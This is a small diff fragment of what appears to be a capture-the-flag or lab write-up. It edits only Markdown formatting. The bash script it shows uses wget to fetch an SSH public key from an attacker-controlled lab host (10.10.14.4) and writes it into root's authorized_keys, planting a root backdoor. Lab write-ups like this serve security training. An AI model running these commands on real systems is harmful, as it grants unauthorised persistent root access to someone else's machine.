@@ -64,7 +64,7 @@ Local machine (from the directory with the bash script '00-header' inside):
 
 Bash script:
 
->**#!/bin/sh  
+>#!/bin/sh  
 **wget http://10.10.14.4/root-key-rsa.pub -P /root/.ssh**  
 **cat /root/.ssh/root-key-rsa.pub > /root/.ssh/authorized_keys**  
 
